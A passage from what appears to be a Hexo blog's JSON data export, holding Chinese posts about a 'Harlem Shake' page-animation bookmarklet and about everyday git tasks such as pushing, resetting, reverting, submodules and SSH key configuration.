th;L++){var A=C[L];if(v(A)){O.push(A)}}})()'>High一下!</a></li>\n```\n\n","source":"_posts/article/hexo/High一下.md","raw":"title: High一下\ntags:\n  - hexo\ncategories:\n  - 博客搭建\ndate: 2016-02-16 18:06:00\n---\n\n<img src=\"/asserts/images/logo/blog.png\" class=\"img-logo img-center\" />\n\n\n## 一、前言\n本文内容基于wuchong的Jacman主题。\n\n让网站元素动起来，从[酷壳](http://coolshell.cn/)网站抄过来的，套到hexo博客菜单里。\n\n\n## 二、代码\n代码：themes/jacman/layout/_partial/header.ejs\n\n找到 ==theme.menu== 位置，代码在菜单遍历输出后，添加如下代码：\n``` html\n<li><a title=\"把这个链接拖到你的Chrome收藏夹工具栏中\" href='javascript:(function(){function c(){var e=document.createElement(\"link\");e.setAttribute(\"type\",\"text/css\");e.setAt    tribute(\"rel\",\"stylesheet\");e.setAttribute(\"href\",f);e.setAttribute(\"class\",l);document.body.appendChild(e)}function h(){var e=document.getElementsByClassName(l);for(var t=0;t<e.length;t++){document    .body.removeChild(e[t])}}function p(){var e=document.createElement(\"div\");e.setAttribute(\"class\",a);document.body.appendChild(e);setTimeout(function(){document.body.removeChild(e)},100)}function d(e    ){return{height:e.offsetHeight,width:e.offsetWidth}}function v(i){var s=d(i);return s.height>e&amp;&amp;s.height<n&amp;&amp;s.width>t&amp;&amp;s.width<r}function m(e){var t=e;var n=0;while(!!t){n+=t    .offsetTop;t=t.offsetParent}return n}function g(){var e=document.documentElement;if(!!window.innerWidth){return window.innerHeight}else if(e&amp;&amp;!isNaN(e.clientHeight)){return e.clientHeight}re    turn 0}function y(){if(window.pageYOffset){return window.pageYOffset}return Math.max(document.documentElement.scrollTop,document.body.scrollTop)}function E(e){var t=m(e);return t>=w&amp;&amp;t<=b+w}    function S(){var e=document.createElement(\"audio\");e.setAttribute(\"class\",l);e.src=i;e.loop=false;e.addEventListener(\"canplay\",function(){setTimeout(function(){x(k)},500);setTimeout(function(){N();p    ();for(var e=0;e<O.length;e++){T(O[e])}},15500)},true);e.addEventListener(\"ended\",function(){N();h()},true);e.innerHTML=\" <p>If you are reading this, it is because your browser does not support the     audio element. We recommend that you get a new browser.</p> <p>\";document.body.appendChild(e);e.play()}function x(e){e.className+=\" \"+s+\" \"+o}function T(e){e.className+=\" \"+s+\" \"+u[Math.floor(Math.r    andom()*u.length)]}function N(){var e=document.getElementsByClassName(s);var t=new RegExp(\"\\\\b\"+s+\"\\\\b\");for(var n=0;n<e.length;){e[n].className=e[n].className.replace(t,\"\")}}var e=30;var t=30;var n    =350;var r=350;var i=\"//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake.mp3\";var s=\"mw-harlem_shake_me\";var o=\"im_first\";var u=[\"im_drunk\",\"im_baked\",\"im_trippin\",\"im_blown\"];var a=\"mw-st    robe_light\";var f=\"//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css\";var l=\"mw_added_css\";var b=g();var w=y();var C=document.getElementsByTagName(\"*\");var k=null;for(var L=0;L<    C.length;L++){var A=C[L];if(v(A)){if(E(A)){k=A;break}}}if(A===null){console.warn(\"Could not find a node of the right size. Please try a different page.\");return}c();S();var O=[];for(var L=0;L<C.leng    th;L++){var A=C[L];if(v(A)){O.push(A)}}})()'>High一下!</a></li>\n```\n\n","slug":"article/hexo/High一下","published":1,"updated":"2016-04-06T08:22:13.000Z","_id":"cilpxkgc20055avbtxdstdtvr","comments":1,"layout":"post","photos":[],"link":""},{"title":"推送本地git仓库","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" />\n\n\n本文参考：[Create Local Git Repo & Push to GitHub](https://www.texniq.de/en/web-engineering-i/create-local-git-repo-and-push-to-github)\n\n\n## 一、打开终端\n\n## 二、到本地文件目录\n > cd /home/developer/public_html\n\n## 三、配置git\n用户名：\n`git config --global user.name \"叶绍亭\"`\n\n邮箱：\n`git config --global user.email \"yeshaoting@163.com\"`\n\n配色方案：\n`git config --global color.ui auto`\n\n## 四、 项目初始化\n`git init`\n\n初始化成功会看到如下内容：\n``` shell\n\"Initialized empty Git repository in home/developer/public_html/.git\"\n```\n\n<!-- more -->\n\n## 五、验证初始化后的状态\n`git status`\n\n应该能看到类似如下的信息：\n``` shell\n# On branch master\n#\n# Initial commit\n#\n# Untracked files:\n#   (use \"git add <file>...\" to include in what will be committed)\n#\n#   .project\n#   bootstrap/\n#   index.html\nnothing added to commit but untracked files present (use \"git add\" to track)\n```\n\n## 六、添加文件或者目录到索引(index)\n`git add *`\n\n应该能看到类似如下的信息：\n``` shell\n# On branch master\n#\n# Initial commit\n#\n# Changes to be committed:\n#   (use \"git rm --cached <file>...\" to unstage)\n#\n#   new file:   bootstrap/css/bootstrap-theme.css推送本地git仓库\n#   new file:   bootstrap/css/bootstrap-theme.min.css\n#   new file:   bootstrap/css/bootstrap.css\n#   new file:   bootstrap/css/bootstrap.min.css\n#   new file:   bootstrap/css/custom.css\n#   new file:   bootstrap/css/offcanvas.css\n#   new file:   bootstrap/fonts/glyphicons-halflings-regular.eot\n#   new file:   bootstrap/fonts/glyphicons-halflings-regular.svg\n#   new file:   bootstrap/fonts/glyphicons-halflings-regular.ttf\n#   new file:   bootstrap/fonts/glyphicons-halflings-regular.woff\n#   new file:   bootstrap/js/bootstrap.js\n#   new file:   bootstrap/js/bootstrap.min.js\n#   new file:   bootstrap/js/holder.js\n#   new file:   index.html\n#\n# Untracked files:\n#   (use \"git add <file>...\" to include in what will be committed)\n#\n#   .project\n```\n\n## 七、提交索引内容到仓库(repository)\n`git commit -m \"My first commit\"`\n\n应该能看到类似如下的信息：\n``` shell\n[master (root-commit) c43daef] My first commit\n14 files changed, 9927 insertions(+)\ncreate mode 100644 bootstrap/css/bootstrap-theme.css\ncreate mode 100644 bootstrap/css/bootstrap-theme.min.css\ncreate mode 100644 bootstrap/css/bootstrap.css\ncreate mode 100644 bootstrap/css/bootstrap.min.css\ncreate mode 100644 bootstrap/css/custom.css\ncreate mode 100755 bootstrap/css/offcanvas.css\ncreate mode 100644 bootstrap/fonts/glyphicons-halflings-regular.eot\ncreate mode 100644 bootstrap/fonts/glyphicons-halflings-regular.svg\ncreate mode 100644 bootstrap/fonts/glyphicons-halflings-regular.ttf\ncreate mode 100644 bootstrap/fonts/glyphicons-halflings-regular.woff\ncreate mode 100644 bootstrap/js/bootstrap.js\ncreate mode 100644 bootstrap/js/bootstrap.min.js\ncreate mode 100755 bootstrap/js/holder.js\ncreate mode 100644 index.html\n```\n\n## 八、提交索引内容到仓库(repository)\n`git status`\n\n应该能看到类似如下的信息：\n``` shell\n# On branch master\n#\n# Initial commit\n#\n# Untracked files:\n#   (use \"git add <file>...\" to include in what will be committed)\n#\n#   .project\n#   bootstrap/\n#   index.html\nnothing added to commit but untracked files present (use \"git add\" to track) \n```\n\n## 九、创建git账户及远程代码仓库\n\n## 十、连接本地仓库与远程仓库\n`git remote add origin git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git`\n\n应该能看到类似如下的信息：\n``` shell\nCounting objects: 20, done.\nDelta compression using up to 8 threads.\nCompressing objects: 100% (20/20), done.\nWriting objects: 100% (20/20), 121.70 KiB | 0 bytes/s, done.\nTotal 20 (delta 2), reused 0 (delta 0)\nTo https://github.com/your_name/your_repo.git\n* [new branch]      master -> master\nBranch master set up to track remote branch master from origin.\n```\n\n## 十一、推送本地仓库到远程仓库\n`git push -u origin master`\n\n应该能看到类似如下的信息：\n``` shell\nCounting objects: 10, done.\nDelta compression using up to 4 threads.\nCompressing objects: 100% (6/6), done.\nWriting objects: 100% (9/9), 1.33 KiB | 0 bytes/s, done.\nTotal 9 (delta 0), reused 0 (delta 0)\nTo git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git\n   8a82c26..90efea5  master -> master\n分支 master 设置为跟踪来自 origin 的远程分支 master。\n```\n\n### 补充说明\n如若出现如下错误：\n``` shell\nTo git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git\n ! [rejected]        master -> master (fetch first)\nerror: 无法推送一些引用到 'git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git'\n提示：更新被拒绝，因为远程版本库包含您本地尚不存在的提交。这通常是因为另外\n提示：一个版本库已向该引用进行了推送。再次推送前，您可能需要先整合远程变更\n提示：（如 'git pull ...'）。\n提示：详见 'git push --help' 中的 'Note about fast-forwards' 小节。\n```\n\n说明，远程代码仓库已经存在部分代码，且未 pull 最新代码到本地仓库，出现冲突。\n此时，执行如下命令即可：\n`git pull origin master`\n\n``` shell\n来自 git.oschina.net:yeshaoting/martinye-demo-spring-velocity\n * branch            master     -> FETCH_HEAD\nMerge made by the 'recursive' strategy.\n LICENSE   | 191 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n README.md |   1 +\n 2 files changed, 192 insertions(+)\n create mode 100644 LICENSE\n create mode 100644 README.md\n```\n\n","source":"_posts/article/git/推送本地git仓库.md","raw":"categories:\n  - 版本控制\ntags:\n  - git\ntitle: 推送本地git仓库\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" />\n\n\n本文参考：[Create Local Git Repo & Push to GitHub](https://www.texniq.de/en/web-engineering-i/create-local-git-repo-and-push-to-github)\n\n\n## 一、打开终端\n\n## 二、到本地文件目录\n > cd /home/developer/public_html\n\n## 三、配置git\n用户名：\n`git config --global user.name \"叶绍亭\"`\n\n邮箱：\n`git config --global user.email \"yeshaoting@163.com\"`\n\n配色方案：\n`git config --global color.ui auto`\n\n## 四、 项目初始化\n`git init`\n\n初始化成功会看到如下内容：\n``` shell\n\"Initialized empty Git repository in home/developer/public_html/.git\"\n```\n\n<!-- more -->\n\n## 五、验证初始化后的状态\n`git status`\n\n应该能看到类似如下的信息：\n``` shell\n# On branch master\n#\n# Initial commit\n#\n# Untracked files:\n#   (use \"git add <file>...\" to include in what will be committed)\n#\n#   .project\n#   bootstrap/\n#   index.html\nnothing added to commit but untracked files present (use \"git add\" to track)\n```\n\n## 六、添加文件或者目录到索引(index)\n`git add *`\n\n应该能看到类似如下的信息：\n``` shell\n# On branch master\n#\n# Initial commit\n#\n# Changes to be committed:\n#   (use \"git rm --cached <file>...\" to unstage)\n#\n#   new file:   bootstrap/css/bootstrap-theme.css推送本地git仓库\n#   new file:   bootstrap/css/bootstrap-theme.min.css\n#   new file:   bootstrap/css/bootstrap.css\n#   new file:   bootstrap/css/bootstrap.min.css\n#   new file:   bootstrap/css/custom.css\n#   new file:   bootstrap/css/offcanvas.css\n#   new file:   bootstrap/fonts/glyphicons-halflings-regular.eot\n#   new file:   bootstrap/fonts/glyphicons-halflings-regular.svg\n#   new file:   bootstrap/fonts/glyphicons-halflings-regular.ttf\n#   new file:   bootstrap/fonts/glyphicons-halflings-regular.woff\n#   new file:   bootstrap/js/bootstrap.js\n#   new file:   bootstrap/js/bootstrap.min.js\n#   new file:   bootstrap/js/holder.js\n#   new file:   index.html\n#\n# Untracked files:\n#   (use \"git add <file>...\" to include in what will be committed)\n#\n#   .project\n```\n\n## 七、提交索引内容到仓库(repository)\n`git commit -m \"My first commit\"`\n\n应该能看到类似如下的信息：\n``` shell\n[master (root-commit) c43daef] My first commit\n14 files changed, 9927 insertions(+)\ncreate mode 100644 bootstrap/css/bootstrap-theme.css\ncreate mode 100644 bootstrap/css/bootstrap-theme.min.css\ncreate mode 100644 bootstrap/css/bootstrap.css\ncreate mode 100644 bootstrap/css/bootstrap.min.css\ncreate mode 100644 bootstrap/css/custom.css\ncreate mode 100755 bootstrap/css/offcanvas.css\ncreate mode 100644 bootstrap/fonts/glyphicons-halflings-regular.eot\ncreate mode 100644 bootstrap/fonts/glyphicons-halflings-regular.svg\ncreate mode 100644 bootstrap/fonts/glyphicons-halflings-regular.ttf\ncreate mode 100644 bootstrap/fonts/glyphicons-halflings-regular.woff\ncreate mode 100644 bootstrap/js/bootstrap.js\ncreate mode 100644 bootstrap/js/bootstrap.min.js\ncreate mode 100755 bootstrap/js/holder.js\ncreate mode 100644 index.html\n```\n\n## 八、提交索引内容到仓库(repository)\n`git status`\n\n应该能看到类似如下的信息：\n``` shell\n# On branch master\n#\n# Initial commit\n#\n# Untracked files:\n#   (use \"git add <file>...\" to include in what will be committed)\n#\n#   .project\n#   bootstrap/\n#   index.html\nnothing added to commit but untracked files present (use \"git add\" to track) \n```\n\n## 九、创建git账户及远程代码仓库\n\n## 十、连接本地仓库与远程仓库\n`git remote add origin git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git`\n\n应该能看到类似如下的信息：\n``` shell\nCounting objects: 20, done.\nDelta compression using up to 8 threads.\nCompressing objects: 100% (20/20), done.\nWriting objects: 100% (20/20), 121.70 KiB | 0 bytes/s, done.\nTotal 20 (delta 2), reused 0 (delta 0)\nTo https://github.com/your_name/your_repo.git\n* [new branch]      master -> master\nBranch master set up to track remote branch master from origin.\n```\n\n## 十一、推送本地仓库到远程仓库\n`git push -u origin master`\n\n应该能看到类似如下的信息：\n``` shell\nCounting objects: 10, done.\nDelta compression using up to 4 threads.\nCompressing objects: 100% (6/6), done.\nWriting objects: 100% (9/9), 1.33 KiB | 0 bytes/s, done.\nTotal 9 (delta 0), reused 0 (delta 0)\nTo git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git\n   8a82c26..90efea5  master -> master\n分支 master 设置为跟踪来自 origin 的远程分支 master。\n```\n\n### 补充说明\n如若出现如下错误：\n``` shell\nTo git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git\n ! [rejected]        master -> master (fetch first)\nerror: 无法推送一些引用到 'git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git'\n提示：更新被拒绝，因为远程版本库包含您本地尚不存在的提交。这通常是因为另外\n提示：一个版本库已向该引用进行了推送。再次推送前，您可能需要先整合远程变更\n提示：（如 'git pull ...'）。\n提示：详见 'git push --help' 中的 'Note about fast-forwards' 小节。\n```\n\n说明，远程代码仓库已经存在部分代码，且未 pull 最新代码到本地仓库，出现冲突。\n此时，执行如下命令即可：\n`git pull origin master`\n\n``` shell\n来自 git.oschina.net:yeshaoting/martinye-demo-spring-velocity\n * branch            master     -> FETCH_HEAD\nMerge made by the 'recursive' strategy.\n LICENSE   | 191 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n README.md |   1 +\n 2 files changed, 192 insertions(+)\n create mode 100644 LICENSE\n create mode 100644 README.md\n```\n\n","slug":"article/git/推送本地git仓库","published":1,"updated":"2016-03-31T15:13:39.000Z","_id":"cilpxkgc40058avbta99weoib","comments":1,"layout":"post","photos":[],"link":""},{"title":"回滚git代码版本","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" />\n\n\n**参考**：[Git的撤消操作 - 重置, 签出 和 撤消](http://gitbook.liuhui998.com/4_9.html)\n\n错提交代码，或者某个版本代码之后想要回滚回来的话，就会遇到需要回滚代码版本的问题。\n\n根据代码当前提交状态，回滚操作可以分为二类：\n1. 未提交代码\n2. 已提交代码\n\n\n## 一、回滚未提交代码\n\n[git reset三种方式](http://blog.csdn.net/wujiangguizhen/article/details/10609647)：\n1. 只回滚本地代码库(HEAD)内容，不回滚索引(index)和工作区(working)内容。\n`git reset --soft 版本号`\n\n2. (**默认**)只回滚本地代码库(HEAD)和索引(index)内容，不回滚工作区(working)内容。\n`git reset --mixed 版本号`\n\n3. 回滚本地代码库(HEAD)、索引(index)和工作区(working)内容。\n`git reset --hard 版本号`\n\n<!-- more -->\n\n**常用命令**\n\n1. 回滚到上一个版本\n`git reset HEAD`\n\n2. 回滚到上上个版本\n`git reset HEAD^`\n\n3. 回滚到指定版本\n`git reset 057d`\n\n**注**：此处回滚的含义是与当前分支远程代码库(target)内容保持一致。\n\n### 举例说明\n\n**参考**：[git-reset](https://git-scm.com/docs/git-reset)\n\n#### 举例1\n| # | working | index | HEAD | target |\n|----|----|----|----|----|\n| current | A | B | C | D |\n| soft | A | B | D | D |\n| mixed | A | D | D | D |\n| hard | D | D | D | D |\n\n#### 举例2\n| # | working | index | HEAD | target |\n|----|----|----|----|----|\n| current | A | B | C | C |\n| soft | A | B | C | C |\n| mixed | A | C | C | C |\n| hard | C | C | C | C |\n\n\n\n## 二、回滚已提交代码\n\n\n### 1. 回滚已经提交，且已发布代码\n\n参考：[git revert 用法](http://blog.chinaunix.net/uid-26770731-id-3285880.html)\n\ngit revert撤销某次操作，此次操作之前和之后的commit和history都会保留，并且把这次撤销作为一次最新的提交。\ngit revert是提交一个新的版本，将需要revert的版本的内容再反向修改回去，版本会递增，不影响之前提交的内容。\n\n**常用命令**\n\n1. 撤销前一次 commit\n`git revert HEAD`\n\n2. 撤销前前一次 commit\n`git revert HEAD^`\n\n3. 撤销指定的版本，撤销也会作为一次提交进行保存\n`git revert commit fa042ce57ebbe5bb9c8db709f719cec2c58ee7ff`\n\n\n#### 举例说明\n代码版本库中间一段提交内容如下：\n```\ncommit c15ebaadf86bde882035a68e09f0b7832ea271f6\n    删除无用文件\n\ncommit 763ab06edb1b5054fbd12e94317e2f13ac4b2af5\n    修改静态资源版本\n\ncommit 277563b24904f3f70eb210f6fa1d3f3f1ee914ac\n    pvrs接口切回测试环境\n\ncommit a00d98c53e86182054eb4e77a18e3044f5f9d658\n    搜索无数据返回，导致空指针异常处理\n```\n\n如果期望代码回滚到 **277563b24904f3f70eb210f6fa1d3f3f1ee914ac** 这个状态的话，则需要撤销后一个版本 **763ab06edb1b5054fbd12e94317e2f13ac4b2af5** 以后的所有代码提交。\n执行命令：`git revert 763ab06edb1b5054fbd12e94317e2f13ac4b2af5`\n\n\n\n### 2. 回滚已经提交，但未发布代码\n\n**参考**：[Git 基础 - 撤消操作](https://git-scm.com/book/zh/v1/Git-%E5%9F%BA%E7%A1%80-%E6%92%A4%E6%B6%88%E6%93%8D%E4%BD%9C)\n\n``` shell\ngit commit -m 'initial commit'\ngit add forgotten_file\ngit commit --amend\n```\n\n","source":"_posts/article/git/如何使用git回退部分修改.md","raw":"categories:\n  - 版本控制\ntags:\n  - git\ntitle: 回滚git代码版本\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" />\n\n\n**参考**：[Git的撤消操作 - 重置, 签出 和 撤消](http://gitbook.liuhui998.com/4_9.html)\n\n错提交代码，或者某个版本代码之后想要回滚回来的话，就会遇到需要回滚代码版本的问题。\n\n根据代码当前提交状态，回滚操作可以分为二类：\n1. 未提交代码\n2. 已提交代码\n\n\n## 一、回滚未提交代码\n\n[git reset三种方式](http://blog.csdn.net/wujiangguizhen/article/details/10609647)：\n1. 只回滚本地代码库(HEAD)内容，不回滚索引(index)和工作区(working)内容。\n`git reset --soft 版本号`\n\n2. (**默认**)只回滚本地代码库(HEAD)和索引(index)内容，不回滚工作区(working)内容。\n`git reset --mixed 版本号`\n\n3. 回滚本地代码库(HEAD)、索引(index)和工作区(working)内容。\n`git reset --hard 版本号`\n\n<!-- more -->\n\n**常用命令**\n\n1. 回滚到上一个版本\n`git reset HEAD`\n\n2. 回滚到上上个版本\n`git reset HEAD^`\n\n3. 回滚到指定版本\n`git reset 057d`\n\n**注**：此处回滚的含义是与当前分支远程代码库(target)内容保持一致。\n\n### 举例说明\n\n**参考**：[git-reset](https://git-scm.com/docs/git-reset)\n\n#### 举例1\n| # | working | index | HEAD | target |\n|----|----|----|----|----|\n| current | A | B | C | D |\n| soft | A | B | D | D |\n| mixed | A | D | D | D |\n| hard | D | D | D | D |\n\n#### 举例2\n| # | working | index | HEAD | target |\n|----|----|----|----|----|\n| current | A | B | C | C |\n| soft | A | B | C | C |\n| mixed | A | C | C | C |\n| hard | C | C | C | C |\n\n\n\n## 二、回滚已提交代码\n\n\n### 1. 回滚已经提交，且已发布代码\n\n参考：[git revert 用法](http://blog.chinaunix.net/uid-26770731-id-3285880.html)\n\ngit revert撤销某次操作，此次操作之前和之后的commit和history都会保留，并且把这次撤销作为一次最新的提交。\ngit revert是提交一个新的版本，将需要revert的版本的内容再反向修改回去，版本会递增，不影响之前提交的内容。\n\n**常用命令**\n\n1. 撤销前一次 commit\n`git revert HEAD`\n\n2. 撤销前前一次 commit\n`git revert HEAD^`\n\n3. 撤销指定的版本，撤销也会作为一次提交进行保存\n`git revert commit fa042ce57ebbe5bb9c8db709f719cec2c58ee7ff`\n\n\n#### 举例说明\n代码版本库中间一段提交内容如下：\n```\ncommit c15ebaadf86bde882035a68e09f0b7832ea271f6\n    删除无用文件\n\ncommit 763ab06edb1b5054fbd12e94317e2f13ac4b2af5\n    修改静态资源版本\n\ncommit 277563b24904f3f70eb210f6fa1d3f3f1ee914ac\n    pvrs接口切回测试环境\n\ncommit a00d98c53e86182054eb4e77a18e3044f5f9d658\n    搜索无数据返回，导致空指针异常处理\n```\n\n如果期望代码回滚到 **277563b24904f3f70eb210f6fa1d3f3f1ee914ac** 这个状态的话，则需要撤销后一个版本 **763ab06edb1b5054fbd12e94317e2f13ac4b2af5** 以后的所有代码提交。\n执行命令：`git revert 763ab06edb1b5054fbd12e94317e2f13ac4b2af5`\n\n\n\n### 2. 回滚已经提交，但未发布代码\n\n**参考**：[Git 基础 - 撤消操作](https://git-scm.com/book/zh/v1/Git-%E5%9F%BA%E7%A1%80-%E6%92%A4%E6%B6%88%E6%93%8D%E4%BD%9C)\n\n``` shell\ngit commit -m 'initial commit'\ngit add forgotten_file\ngit commit --amend\n```\n\n","slug":"article/git/如何使用git回退部分修改","published":1,"updated":"2016-03-31T15:13:36.000Z","_id":"cilpxkgc7005davbtasqi0jlz","comments":1,"layout":"post","photos":[],"link":""},{"title":"git拉取submodule","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" />\n\n\n## 一、执行步骤\n\n### 1. 添加子模块配置\n子模块的URL加入到.git/config\ngit submodule init\n\n### 2. 查看模块状态\ngit submodule status\n\n### 3. 拉取子模块\n克隆子模块的仓库和签出父项目中指定的那个版本\ngit submodule update\n\n### 4. 切换子模块版本\ngit submodule foreach git checkout develop\n\n\n## 二、参考文档\n[Git Community Book 中文版 - 子模块](http://gitbook.liuhui998.com/5_10.html)\n","source":"_posts/article/git/git拉取submodule.md","raw":"categories:\n  - 版本控制\ntitle: git拉取submodule\ntags:\n  - git\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" />\n\n\n## 一、执行步骤\n\n### 1. 添加子模块配置\n子模块的URL加入到.git/config\ngit submodule init\n\n### 2. 查看模块状态\ngit submodule status\n\n### 3. 拉取子模块\n克隆子模块的仓库和签出父项目中指定的那个版本\ngit submodule update\n\n### 4. 切换子模块版本\ngit submodule foreach git checkout develop\n\n\n## 二、参考文档\n[Git Community Book 中文版 - 子模块](http://gitbook.liuhui998.com/5_10.html)\n","slug":"article/git/git拉取submodule","published":1,"updated":"2016-03-31T15:13:26.000Z","_id":"cilpxkgca005gavbt7w9nndm8","comments":1,"layout":"post","photos":[],"link":""},{"title":"git多仓库配置","date":"2016-02-18T04:32:00.000Z","_content":"\n<img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" />\n\n\n\n## 一、密钥选择\n默认情况下，git会使用id_rsa与id_rsa.pub的密钥对，与git代码服务器进行通信。但是，对于同一台机器需要与不同的git代码服务器进行通信的需求，则需要进行特别指定。\n\n例如：需要针对于github使用非默认的密钥对，则可向~/.ssh/config添加如下配置：\n``` bash\nHost github.com\nHostName github.com\nUser git\nIdentityFile /Users/yeshaoting/.ssh/id_rsa_github\n```\n\n\n## 二、用户配置\n代码提交的用户信息。\n\n### 1. 全局配置\n``` bash\ngit config --global user.name \"叶绍亭\"\ngit config --global user.email \"yeshaoting@meituan.com\"\n```\n\n会在用户目录生成或修改~/.gitconfig文件。\n默认情况下，会使用此文件里的配置内容。\n\n\n### 2. 仓库配置\n``` bash\ngit config user.name \"yeshaoting\"\ngit config user.email \"yeshaoting@163.com\"\n```\n\n会修改当前仓库.git/config文件内容。\n此文件里的配置会覆盖全局配置里相同的配置内容。\n\n\n## 三、参考文档\n - [1.5 起步 - 初次运行 Git 前的配置](https://git-scm.com/book/zh/v1/起步-初次运行-Git-前的配置)\n - [Git: Using Different User Emails for Different Repositories](https://orrsella.com/2013/08/10/git-using-different-user-emails-for-different-repositories/)\n - [Set git email address on a per repository basis](http://dereenigne.org/git/set-git-email-address-on-a-per-repository-basis)\n","source":"_posts/article/git/git多仓库配置.md","raw":"title: git多仓库配置\ntags:\n  - git\ncategories:\n  - 版本控制\ndate: 2016-02-18 12:32:00\n---\n\n<img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" />\n\n\n\n## 一、密钥选择\n默认情况下，git会使用id_rsa与id_rsa.pub的密钥对，与git代码服务器进行通信。但是，对于同一台机器需要与不同的git代码服务器进行通信的需求，则需要进行特别指定。\n\n例如：需要针对于github使用非默认的密钥对，则可向~/.ssh/config添加如下配置：\n``` bash\nHost github.com\nHostName github.com\nUser git\nIdentityFile /Users/yeshaoting/.ssh/id_rsa_github\n```\n\n\n## 二、用户配置\n代码提交的用户信息。\n\n### 1. 全局配置\n``` bash\ngit config --global user.name \"叶绍亭\"\ngit config --global user.email \"yeshaoting@meituan.com\"\n```\n\n会在用户目录生成或修改~/.gitconfig文件。\n默认情况下，会使用此文件里的配置内容。\n\n\n### 2. 仓库配置\n``` bash\ngit config user.name \"yeshaoting\"\ngit config user.email \"yeshaoting@163.com\"\n```\n\n会修改当前仓库.git/config文件内容。\n此文件里的配置会覆盖全局配置里相同的配置内容。\n\n\n## 三、参考文档\n - [1.5 起步 - 初次运行 Git 前的配置](https://git-scm.com/book/zh/v1/起步-初次运行-Git-前的配置)\n - [Git: Using Different User Emails for Different Repositories](https://orrsella.com/2013/08/10/git-using-different-user-emails-for-different-repositories/)\n - [Set git email address on a per repository basis](http://dereenigne.org/git/set-git-email-address-on-a-per-repository-basis)\n","slug":"article/git/git多仓库配置","published":1,"updated":"2016-03-31T15:13:42.000Z","_id":"cilpxkgce005javbtqbxjkjbb","comments":1,"layout":"post","photos":[],"link":""},{"title":"git命令小记","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" />\n\n\n## 1. git日志格式化\n``` shell\ngit whatchanged -1 --pretty=raw --no-abbrev\ngit log -1 --pretty=format:'commit %H%ntree %T%nparent %P%nauthor %an <%ae> %at %ar%ncommitter %cn <%ce> %ct %cr%n%n %s%n%n'\n```\n\n\n## 2. 标签按时间排序\n``` shell\n子模块最新的tag: git submodule foreach 'git tag | xargs -I@ git log --format=format:\"%ci %H @%n\" -1 @ | sort -r | head -1'\ngit tag | xargs -I@ git log --format=format:\"%ci %h @%n\" -1 @ | sort\ngit tag | xargs -I@ git log --format=format:\"%ci %h @%n\" -1 @ | sort -r\n```\n\n\n## 3. 重置本地代码\n`git reset --mixed`：此为默认方式，不带任何参数的git reset，即时这种方式，它回退到某个版本，只保留源码，回退commit和index信息\n`git reset --soft`：回退到某个版本，只回退了commit的信息，不会恢复到index file一级。如果还要提交，直接commit即可\n`git reset --hard`：彻底回退到某个版本，本地的源码也会变为上一个版本的内容\n\n\n## 4. 创建分支\ngit branch develop\n\n\n## 5. 切换分支\ngit checkout develop\n\n<!-- more -->\n\n## 6. 查看分支版本\ngit branch\ngit branch -v\ngit branch -r\n\n\n## 7. 项目多模块更新\ngit submodule init\ngit submodule update\ngit submodule status\n\n\n## 8. 修改最近一次提交\n``` shell\ngit commit -m 'initial commit'\ngit add forgotten_file\ngit commit --amend\n```\n\n\n## 9. git ssh配置\n密钥&公钥对生成(默认生成位置为：~/.ssh)：\nssh-keygen -t rsa -C \"yeshaoting@163.com\"\n\n**说明**：\nid_rsa是密钥，如同个人密码一般，别人拿到这个就能以你的身份登录git。\nid_rsa.pub是公钥，用于在服务器端注册。当访问远程服务器时，远程服务器会拿着他那端的公钥与本机的密钥匹配，成功即可无密码访问。\n\n测试命令：\n> git -T User@Host\n\n### git配置优先顺序\nlocal > global > system\nlocal：项目目录/.git/config\nglobal：当前用户目录/.gitconfig\nsystem：/etc/gitconfig\n\n\n## 10.配置值获取\nconfig demo：\n[user]\n        name = shaotingye\n        email = shaotingye@sohu-inc.com\n\n获取命令为：\n> git config --get user.email\n\n\n## 11. git 放弃本地修改 强制更新\n``` shell\ngit fetch --all\ngit reset --hard origin/master\n```\n\n参考：http://blog.csdn.net/a06062125/article/details/11727273","source":"_posts/article/git/git命令小记.md","raw":"categories:\n  - 版本控制\ntags:\n  - git\n  - 小记\n  - 命令\ntitle: git命令小记\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" />\n\n\n## 1. git日志格式化\n``` shell\ngit whatchanged -1 --pretty=raw --no-abbrev\ngit log -1 --pretty=format:'commit %H%ntree %T%nparent %P%nauthor %an <%ae> %at %ar%ncommitter %cn <%ce> %ct %cr%n%n %s%n%n'\n```\n\n\n## 2. 标签按时间排序\n``` shell\n子模块最新的tag: git submodule foreach 'git tag | xargs -I@ git log --format=format:\"%ci %H @%n\" -1 @ | sort -r | head -1'\ngit tag | xargs -I@ git log --format=format:\"%ci %h @%n\" -1 @ | sort\ngit tag | xargs -I@ git log --format=format:\"%ci %h @%n\" -1 @ | sort -r\n```\n\n\n## 3. 重置本地代码\n`git reset --mixed`：此为默认方式，不带任何参数的git reset，即时这种方式，它回退到某个版本，只保留源码，回退commit和index信息\n`git reset --soft`：回退到某个版本，只回退了commit的信息，不会恢复到index file一级。如果还要提交，直接commit即可\n`git reset 